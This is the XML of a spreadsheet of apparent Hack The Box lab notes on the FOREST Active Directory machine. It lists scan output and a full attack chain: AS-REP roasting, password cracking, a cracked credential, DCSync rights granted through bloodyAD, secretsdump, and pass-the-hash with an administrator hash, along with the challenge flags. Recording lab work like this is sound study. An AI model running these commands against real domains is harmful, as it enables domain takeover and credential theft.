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13_ncr:1_{1F9C7121-3729-41FD-87A8-72B3B4EFC7E1}" xr6:coauthVersionLast="47" xr6:coauthVersionMax="47" xr10:uidLastSave="{00000000-0000-0000-0000-000000000000}"/>
  <bookViews>
    <workbookView xWindow="-120" yWindow="-16320" windowWidth="29040" windowHeight="15720" xr2:uid="{9AA4AFCA-69F3-4FD9-877C-89FBB0C8B483}"/>
  </bookViews>
  <sheets>
    <sheet name="Network" sheetId="1" r:id="rId1"/>
    <sheet name="Web App" sheetId="3" r:id="rId2"/>
    <sheet name="On host" sheetId="4" r:id="rId3"/>
    <sheet name="Commands" sheetId="2" r:id="rId4"/>
    <sheet name="Misc" sheetId="5" r:id="rId5"/>
  </sheets>
  <definedNames>
    <definedName name="_xlnm._FilterDatabase" localSheetId="0" hidden="1">Network!$A$1:$K$1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E14" i="1" l="1"/>
  <c r="E3" i="1"/>
  <c r="E13" i="1"/>
  <c r="E7" i="1"/>
  <c r="E15" i="1"/>
  <c r="E24" i="1"/>
  <c r="E5" i="1"/>
  <c r="E22" i="1"/>
  <c r="E23" i="1"/>
  <c r="E17" i="1"/>
  <c r="E27" i="1"/>
  <c r="E8" i="1"/>
  <c r="E21" i="1"/>
  <c r="E11" i="1"/>
  <c r="E6" i="1"/>
  <c r="E25" i="1"/>
  <c r="E20" i="1"/>
  <c r="E12" i="1"/>
  <c r="E10" i="1"/>
  <c r="E28" i="1"/>
  <c r="E2" i="1"/>
  <c r="E18" i="1"/>
  <c r="E9" i="1"/>
  <c r="E4" i="1"/>
  <c r="E19" i="1"/>
  <c r="E16" i="1"/>
  <c r="E26" i="1"/>
  <c r="F14" i="1"/>
  <c r="F3" i="1"/>
  <c r="F13" i="1"/>
  <c r="F7" i="1"/>
  <c r="F15" i="1"/>
  <c r="F24" i="1"/>
  <c r="F5" i="1"/>
  <c r="F22" i="1"/>
  <c r="F23" i="1"/>
  <c r="F17" i="1"/>
  <c r="F27" i="1"/>
  <c r="F8" i="1"/>
  <c r="F21" i="1"/>
  <c r="F11" i="1"/>
  <c r="F6" i="1"/>
  <c r="F25" i="1"/>
  <c r="F20" i="1"/>
  <c r="F12" i="1"/>
  <c r="F10" i="1"/>
  <c r="F28" i="1"/>
  <c r="F2" i="1"/>
  <c r="F18" i="1"/>
  <c r="F9" i="1"/>
  <c r="F4" i="1"/>
  <c r="F19" i="1"/>
  <c r="F16" i="1"/>
  <c r="F26" i="1"/>
</calcChain>
</file>

<file path=xl/sharedStrings.xml><?xml version="1.0" encoding="utf-8"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="200" uniqueCount="110">
  <si>
    <t>IP</t>
  </si>
  <si>
    <t>Hostname</t>
  </si>
  <si>
    <t>Port</t>
  </si>
  <si>
    <t>Protocol</t>
  </si>
  <si>
    <t>Service</t>
  </si>
  <si>
    <t>Notes</t>
  </si>
  <si>
    <t>Commands used</t>
  </si>
  <si>
    <t>Base URL</t>
  </si>
  <si>
    <t>Path</t>
  </si>
  <si>
    <t>Evidence</t>
  </si>
  <si>
    <t>Resources</t>
  </si>
  <si>
    <t>Host</t>
  </si>
  <si>
    <t>User</t>
  </si>
  <si>
    <t>Privileges</t>
  </si>
  <si>
    <t>Groups</t>
  </si>
  <si>
    <t>OS info</t>
  </si>
  <si>
    <t>Status</t>
  </si>
  <si>
    <t>Status + Path (from Kali)</t>
  </si>
  <si>
    <t>Port + Protocol</t>
  </si>
  <si>
    <t>#=LEFT($D2,FIND("/",$D2)-1)</t>
  </si>
  <si>
    <t>#=MID($D2,FIND("/",$D2)+1,LEN($D2))</t>
  </si>
  <si>
    <t>Files/Artifacts</t>
  </si>
  <si>
    <t>Misc</t>
  </si>
  <si>
    <t>135/tcp</t>
  </si>
  <si>
    <t>49665/tcp</t>
  </si>
  <si>
    <t>49666/tcp</t>
  </si>
  <si>
    <t>445/tcp</t>
  </si>
  <si>
    <t>59055/udp</t>
  </si>
  <si>
    <t>9389/tcp</t>
  </si>
  <si>
    <t>88/tcp</t>
  </si>
  <si>
    <t>5985/tcp</t>
  </si>
  <si>
    <t>47001/tcp</t>
  </si>
  <si>
    <t>49698/tcp</t>
  </si>
  <si>
    <t>139/tcp</t>
  </si>
  <si>
    <t>49677/tcp</t>
  </si>
  <si>
    <t>49683/tcp</t>
  </si>
  <si>
    <t>59219/udp</t>
  </si>
  <si>
    <t>464/tcp</t>
  </si>
  <si>
    <t>49676/tcp</t>
  </si>
  <si>
    <t>3268/tcp</t>
  </si>
  <si>
    <t>389/tcp</t>
  </si>
  <si>
    <t>56830/tcp</t>
  </si>
  <si>
    <t>49671/tcp</t>
  </si>
  <si>
    <t>3269/tcp</t>
  </si>
  <si>
    <t>636/tcp</t>
  </si>
  <si>
    <t>59950/udp</t>
  </si>
  <si>
    <t>53/tcp</t>
  </si>
  <si>
    <t>593/tcp</t>
  </si>
  <si>
    <t>49668/tcp</t>
  </si>
  <si>
    <t>49664/tcp</t>
  </si>
  <si>
    <t>53/tcp    open   domain       Simple DNS Plus</t>
  </si>
  <si>
    <t>88/tcp    open   kerberos-sec Microsoft Windows Kerberos (server time: 2026-06-28 11:42:33Z)</t>
  </si>
  <si>
    <t>135/tcp   open   msrpc        Microsoft Windows RPC</t>
  </si>
  <si>
    <t>139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn</t>
  </si>
  <si>
    <t>389/tcp   open   ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</t>
  </si>
  <si>
    <t>464/tcp   open   kpasswd5?</t>
  </si>
  <si>
    <t>593/tcp   open   ncacn_http   Microsoft Windows RPC over HTTP 1.0</t>
  </si>
  <si>
    <t>636/tcp   open   tcpwrapped</t>
  </si>
  <si>
    <t>3268/tcp  open   ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</t>
  </si>
  <si>
    <t>3269/tcp  open   tcpwrapped</t>
  </si>
  <si>
    <t>5985/tcp  open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0</t>
  </si>
  <si>
    <t>9389/tcp  open   mc-nmf       .NET Message Framing</t>
  </si>
  <si>
    <t>47001/tcp open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found</t>
  </si>
  <si>
    <t>49664/tcp open   msrpc        Microsoft Windows RPC</t>
  </si>
  <si>
    <t>49665/tcp open   msrpc        Microsoft Windows RPC</t>
  </si>
  <si>
    <t>49666/tcp open   msrpc        Microsoft Windows RPC</t>
  </si>
  <si>
    <t>49668/tcp open   msrpc        Microsoft Windows RPC</t>
  </si>
  <si>
    <t>49671/tcp open   msrpc        Microsoft Windows RPC</t>
  </si>
  <si>
    <t>49676/tcp open   ncacn_http   Microsoft Windows RPC over HTTP 1.0</t>
  </si>
  <si>
    <t>49677/tcp open   msrpc        Microsoft Windows RPC</t>
  </si>
  <si>
    <t>49683/tcp open   msrpc        Microsoft Windows RPC</t>
  </si>
  <si>
    <t>49698/tcp open   msrpc        Microsoft Windows RPC</t>
  </si>
  <si>
    <t>56830/tcp open   msrpc        Microsoft Windows RPC</t>
  </si>
  <si>
    <t>445/tcp   open   microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2026-06-28T04:43:35-07:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 2h26m54s, deviation: 4h02m31s, median: 6m53s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2026-06-28T11:43:36
|_  start_date: 2026-06-28T11:27:52</t>
  </si>
  <si>
    <t>Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)</t>
  </si>
  <si>
    <t>cat hosts /etc/hosts | sudo tee /etc/hosts | head -1</t>
  </si>
  <si>
    <t>user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]</t>
  </si>
  <si>
    <t>grep -oP '(?&lt;=user:\[)\w+' raw_users.txt &gt; users.txt</t>
  </si>
  <si>
    <t>https://medium.com/r3d-buck3t/kerberos-attacks-as-rep-roasting-2549fd757b5</t>
  </si>
  <si>
    <t xml:space="preserve">john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt </t>
  </si>
  <si>
    <t xml:space="preserve">svc-alfresco:s3rvice </t>
  </si>
  <si>
    <t>Yeah I'm on the box using svc-alfresco.</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">scv-alfresco does not have pre-auth set.
</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>Cracked the password using John.</t>
    </r>
  </si>
  <si>
    <t>user.txt: b784d3d58059c2e62ec3997b66860f5c</t>
  </si>
  <si>
    <t>svc-alfresco</t>
  </si>
  <si>
    <t>USER INFORMATION
----------------
User Name        SID
================ =============================================
htb\svc-alfresco S-1-5-21-3072663084-364016917-1341370565-1147
GROUP INFORMATION
-----------------
Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Account Operators                  Alias            S-1-5-32-548                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
HTB\Privileged IT Accounts                 Group            S-1-5-21-3072663084-364016917-1341370565-1149 Mandatory group, Enabled by default, Enabled group
HTB\Service Accounts                       Group            S-1-5-21-3072663084-364016917-1341370565-1148 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
USER CLAIMS INFORMATION
-----------------------
User claims unknown.</t>
  </si>
  <si>
    <t>GROUP INFORMATION
-----------------
Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Account Operators                  Alias            S-1-5-32-548                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
HTB\Privileged IT Accounts                 Group            S-1-5-21-3072663084-364016917-1341370565-1149 Mandatory group, Enabled by default, Enabled group
HTB\Service Accounts                       Group            S-1-5-21-3072663084-364016917-1341370565-1148 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192</t>
  </si>
  <si>
    <t>FOREST</t>
  </si>
  <si>
    <t>sudo apt install docker.io &amp;&amp; sudo apt install docker-compose</t>
  </si>
  <si>
    <t xml:space="preserve">sudo usermod -aG docker $USER </t>
  </si>
  <si>
    <t>curl -L https://ghst.ly/getbhce &gt; docker-compose.yml</t>
  </si>
  <si>
    <t>sudo docker-compose pull &amp;&amp; docker-compose up</t>
  </si>
  <si>
    <t>Remove-Item SharpHound.exe</t>
  </si>
  <si>
    <t>root.txt: 07252f76563eae4e91c3b717fea83527</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">I think this is where I run the Bloodhound AD.
GenericAll write on Exchange Windows Permissions group.
Bascially a member of account operators.
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>Members can administer domain user and group accounts
Okay confusing but basically you add the user to the Exchange Windows Permission group. This has write DACL on the domain so you can allow the user to perform a dcsync attack and get the hash. Your computer acts like a DC.</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>Got root.</t>
    </r>
  </si>
  <si>
    <t>https://x7331.gitbook.io/boxes/tl-dr/active-directory/ad-tools/bloodhound
https://github.com/gdedrouas/Exchange-AD-Privesc
https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/</t>
  </si>
  <si>
    <t>[victim IP]</t>
  </si>
  <si>
    <t>sudo masscan -pT:1-65535,U:1-65535 --rate=1000 -e tun0 [victim IP] &gt; raw_ports.txt</t>
  </si>
  <si>
    <t>sudo nmap -p$(cat raw_ports.txt | cut -d ' ' -f 4 | cut -d '/' -f 1 | sort -un | tr '\n' ',' | sed 's/,$//') -sS -sV --version-all -sC -O -T3 -v [victim IP]</t>
  </si>
  <si>
    <t>netexec smb [victim IP] --generate-hosts-file hosts</t>
  </si>
  <si>
    <t>netexec smb [victim IP] -u '' -p '' --shares</t>
  </si>
  <si>
    <t>netexec smb [victim IP] -u 'null' -p '' --shares</t>
  </si>
  <si>
    <t xml:space="preserve">GetNPUsers.py htb.local/ -usersfile "users.txt" -dc-ip [victim IP] -request -format john  </t>
  </si>
  <si>
    <t xml:space="preserve">evil-winrm -i [victim IP] -u svc-alfresco -p s3rvice  </t>
  </si>
  <si>
    <t>sudo ntpdate [victim IP]</t>
  </si>
  <si>
    <t xml:space="preserve">bloodhound-ce-python -u svc-alfresco -p s3rvice -d htb.local -ns [victim IP] -c All --zip  </t>
  </si>
  <si>
    <t>bloodyAD --host [victim IP] -d htb.local -u svc-alfresco -p s3rvice add groupMember "Exchange Windows Permissions" svc-alfresco</t>
  </si>
  <si>
    <t>bloodyAD --host [victim IP] -d htb.local -u svc-alfresco -p s3rvice add dcsync svc-alfresco</t>
  </si>
  <si>
    <t>secretsdump.py htb.local/svc-alfresco:s3rvice@[victim IP]</t>
  </si>
  <si>
    <t>evil-winrm -i [victim IP] -u administrator -h 32693b11e6aa90eb43d32c72a07ceea6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</si>
</sst>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u/>
      <sz val="11"/>
      <color theme="10"/>
      <name val="Aptos Narrow"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <sz val="8"/>
      <name val="Aptos Narrow"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <sz val="11"/>
      <name val="Aptos Narrow"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <b/>
      <sz val="1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0">
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0"/>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0" applyAlignment="1">
      <alignment horizontal="left" vertical="top"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0" applyAlignment="1">
      <alignment horizontal="left" vertical="top" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="1" fillId="0" borderId="0" xfId="0" applyFont="1" applyAlignment="1">
      <alignment horizontal="left" vertical="top"/>
    </xf>
    <xf numFmtId="0" fontId="1" fillId="0" borderId="0" xfId="0" applyFont="1" applyAlignment="1">
      <alignment horizontal="left" vertical="top" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="2" fillId="0" borderId="0" xfId="1" applyAlignment="1">
      <alignment horizontal="left" vertical="top" wrapText="1"/>
    </xf>
    <xf numFmtId="2" fontId="4" fillId="0" borderId="0" xfId="0" applyNumberFormat="1"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2" fontId="5" fillId="0" borderId="0" xfId="0" applyNumberFormat="1" applyFont="1" applyAlignment="1">
      <alignment horizontal="lef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medium.com/r3d-buck3t/kerberos-attacks-as-rep-roasting-2549fd757b5"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x7331.gitbook.io/boxes/tl-dr/active-directory/ad-tools/bloodhound"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7C755-4FE5-4C70-ABDC-86E8ABD7F626}">
  <dimension ref="A1:K28"/>
  <sheetViews>
    <sheetView tabSelected="1" zoomScale="75" zoomScaleNormal="75" workbookViewId="0">
      <pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>
      <selection activeCell="E1" sqref="E1"/>
      <selection pane="bottomLeft" activeCell="G4" sqref="G4"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="20.77734375" style="2" customWidth="1"/>
    <col min="2" max="2" width="29.109375" style="2" bestFit="1" customWidth="1"/>
    <col min="3" max="3" width="22.44140625" style="2" customWidth="1"/>
    <col min="4" max="4" width="15.109375" style="2" customWidth="1"/>
    <col min="5" max="5" width="10.33203125" style="2" customWidth="1"/>
    <col min="6" max="6" width="14.21875" style="2" customWidth="1"/>
    <col min="7" max="7" width="55" style="2" customWidth="1"/>
    <col min="8" max="8" width="62.44140625" style="2" customWidth="1"/>
    <col min="9" max="9" width="48.88671875" style="2" customWidth="1"/>
    <col min="10" max="10" width="47.44140625" style="2" customWidth="1"/>
    <col min="11" max="11" width="52.21875" style="2" customWidth="1"/>
    <col min="12" max="16384" width="8.88671875" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:11" s="4" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="4" t="s">
        <v>0</v>
      </c>
      <c r="B1" s="4" t="s">
        <v>15</v>
      </c>
      <c r="C1" s="4" t="s">
        <v>1</v>
      </c>
      <c r="D1" s="4" t="s">
        <v>18</v>
      </c>
      <c r="E1" s="4" t="s">
        <v>2</v>
      </c>
      <c r="F1" s="4" t="s">
        <v>3</v>
      </c>
      <c r="G1" s="4" t="s">
        <v>4</v>
      </c>
      <c r="H1" s="4" t="s">
        <v>5</v>
      </c>
      <c r="I1" s="4" t="s">
        <v>21</v>
      </c>
      <c r="J1" s="4" t="s">
        <v>10</v>
      </c>
      <c r="K1" s="4" t="s">
        <v>9</v>
      </c>
    </row>
    <row r="2" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="1" t="s">
        <v>96</v>
      </c>
      <c r="B2" s="2" t="s">
        <v>74</v>
      </c>
      <c r="C2" s="2" t="s">
        <v>87</v>
      </c>
      <c r="D2" s="2" t="s">
        <v>46</v>
      </c>
      <c r="E2" s="6" t="str">
        <f t="shared" ref="E2:E28" si="0">LEFT($D2,FIND("/",$D2)-1)</f>
        <v>53</v>
      </c>
      <c r="F2" s="7" t="str">
        <f t="shared" ref="F2:F28" si="1">MID($D2,FIND("/",$D2)+1,LEN($D2))</f>
        <v>tcp</v>
      </c>
      <c r="G2" s="2" t="s">
        <v>50</v>
      </c>
    </row>
    <row r="3" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A3" s="2" t="s">
        <v>96</v>
      </c>
      <c r="B3" s="2" t="s">
        <v>74</v>
      </c>
      <c r="C3" s="2" t="s">
        <v>87</v>
      </c>
      <c r="D3" s="2" t="s">
        <v>29</v>
      </c>
      <c r="E3" s="9" t="str">
        <f t="shared" si="0"/>
        <v>88</v>
      </c>
      <c r="F3" s="7" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G3" s="4" t="s">
        <v>51</v>
      </c>
      <c r="H3" s="4" t="s">
        <v>82</v>
      </c>
      <c r="I3" s="4" t="s">
        <v>80</v>
      </c>
      <c r="J3" s="5" t="s">
        <v>78</v>
      </c>
    </row>
    <row r="4" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A4" s="2" t="s">
        <v>96</v>
      </c>
      <c r="B4" s="2" t="s">
        <v>74</v>
      </c>
      <c r="C4" s="2" t="s">
        <v>87</v>
      </c>
      <c r="D4" s="2" t="s">
        <v>23</v>
      </c>
      <c r="E4" s="6" t="str">
        <f t="shared" si="0"/>
        <v>135</v>
      </c>
      <c r="F4" s="7" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G4" s="2" t="s">
        <v>52</v>
      </c>
    </row>
    <row r="5" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A5" s="1" t="s">
        <v>96</v>
      </c>
      <c r="B5" s="2" t="s">
        <v>74</v>
      </c>
      <c r="C5" s="2" t="s">
        <v>87</v>
      </c>
      <c r="D5" s="2" t="s">
        <v>33</v>
      </c>
      <c r="E5" s="6" t="str">
        <f t="shared" si="0"/>
        <v>139</v>
      </c>
      <c r="F5" s="7" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G5" s="2" t="s">
        <v>53</v>
      </c>
    </row>
    <row r="6" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A6" s="1" t="s">
        <v>96</v>
      </c>
      <c r="B6" s="2" t="s">
        <v>74</v>
      </c>
      <c r="C6" s="2" t="s">
        <v>87</v>
      </c>
      <c r="D6" s="2" t="s">
        <v>40</v>
      </c>
      <c r="E6" s="6" t="str">
        <f t="shared" si="0"/>
        <v>389</v>
      </c>
      <c r="F6" s="7" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G6" s="2" t="s">
        <v>54</v>
      </c>
    </row>
    <row r="7" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A7" s="2" t="s">
        <v>96</v>
      </c>
      <c r="B7" s="2" t="s">
        <v>74</v>
      </c>
      <c r="C7" s="2" t="s">
        <v>87</v>
      </c>
      <c r="D7" s="2" t="s">
        <v>26</v>
      </c>
      <c r="E7" s="9" t="str">
        <f t="shared" si="0"/>
        <v>445</v>
      </c>
      <c r="F7" s="7" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G7" s="2" t="s">
        <v>73</v>
      </c>
      <c r="H7" s="4"/>
      <c r="I7" s="2" t="s">
        <v>76</v>
      </c>
      <c r="J7" s="5"/>
    </row>
    <row r="8" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A8" s="2" t="s">
        <v>96</v>
      </c>
      <c r="B8" s="2" t="s">
        <v>74</v>
      </c>
      <c r="C8" s="2" t="s">
        <v>87</v>
      </c>
      <c r="D8" s="2" t="s">
        <v>37</v>
      </c>
      <c r="E8" s="6" t="str">
        <f t="shared" si="0"/>
        <v>464</v>
      </c>
      <c r="F8" s="7" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G8" s="2" t="s">
        <v>55</v>
      </c>
    </row>
    <row r="9" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A9" s="1" t="s">
        <v>96</v>
      </c>
      <c r="B9" s="2" t="s">
        <v>74</v>
      </c>
      <c r="C9" s="2" t="s">
        <v>87</v>
      </c>
      <c r="D9" s="2" t="s">
        <v>47</v>
      </c>
      <c r="E9" s="6" t="str">
        <f t="shared" si="0"/>
        <v>593</v>
      </c>
      <c r="F9" s="7" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G9" s="2" t="s">
        <v>56</v>
      </c>
    </row>
    <row r="10" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A10" s="1" t="s">
        <v>96</v>
      </c>
      <c r="B10" s="2" t="s">
        <v>74</v>
      </c>
      <c r="C10" s="2" t="s">
        <v>87</v>
      </c>
      <c r="D10" s="2" t="s">
        <v>44</v>
      </c>
      <c r="E10" s="6" t="str">
        <f t="shared" si="0"/>
        <v>636</v>
      </c>
      <c r="F10" s="7" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G10" s="2" t="s">
        <v>57</v>
      </c>
    </row>
    <row r="11" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A11" s="2" t="s">
        <v>96</v>
      </c>
      <c r="B11" s="2" t="s">
        <v>74</v>
      </c>
      <c r="C11" s="2" t="s">
        <v>87</v>
      </c>
      <c r="D11" s="2" t="s">
        <v>39</v>
      </c>
      <c r="E11" s="6" t="str">
        <f t="shared" si="0"/>
        <v>3268</v>
      </c>
      <c r="F11" s="7" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G11" s="2" t="s">
        <v>58</v>
      </c>
      <c r="I11" s="4"/>
      <c r="J11" s="5"/>
    </row>
    <row r="12" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A12" s="2" t="s">
        <v>96</v>
      </c>
      <c r="B12" s="2" t="s">
        <v>74</v>
      </c>
      <c r="C12" s="2" t="s">
        <v>87</v>
      </c>
      <c r="D12" s="2" t="s">
        <v>43</v>
      </c>
      <c r="E12" s="6" t="str">
        <f t="shared" si="0"/>
        <v>3269</v>
      </c>
      <c r="F12" s="7" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G12" s="2" t="s">
        <v>59</v>
      </c>
    </row>
    <row r="13" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A13" s="1" t="s">
        <v>96</v>
      </c>
      <c r="B13" s="2" t="s">
        <v>74</v>
      </c>
      <c r="C13" s="2" t="s">
        <v>87</v>
      </c>
      <c r="D13" s="2" t="s">
        <v>30</v>
      </c>
      <c r="E13" s="6" t="str">
        <f t="shared" si="0"/>
        <v>5985</v>
      </c>
      <c r="F13" s="7" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G13" s="4" t="s">
        <v>60</v>
      </c>
      <c r="H13" s="2" t="s">
        <v>81</v>
      </c>
      <c r="I13" s="4" t="s">
        <v>83</v>
      </c>
      <c r="J13" s="5"/>
    </row>
    <row r="14" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A14" s="1" t="s">
        <v>96</v>
      </c>
      <c r="B14" s="2" t="s">
        <v>74</v>
      </c>
      <c r="C14" s="2" t="s">
        <v>87</v>
      </c>
      <c r="D14" s="2" t="s">
        <v>28</v>
      </c>
      <c r="E14" s="6" t="str">
        <f t="shared" si="0"/>
        <v>9389</v>
      </c>
      <c r="F14" s="7" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G14" s="2" t="s">
        <v>61</v>
      </c>
    </row>
    <row r="15" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A15" s="1" t="s">
        <v>96</v>
      </c>
      <c r="B15" s="2" t="s">
        <v>74</v>
      </c>
      <c r="C15" s="2" t="s">
        <v>87</v>
      </c>
      <c r="D15" s="2" t="s">
        <v>31</v>
      </c>
      <c r="E15" s="6" t="str">
        <f t="shared" si="0"/>
        <v>47001</v>
      </c>
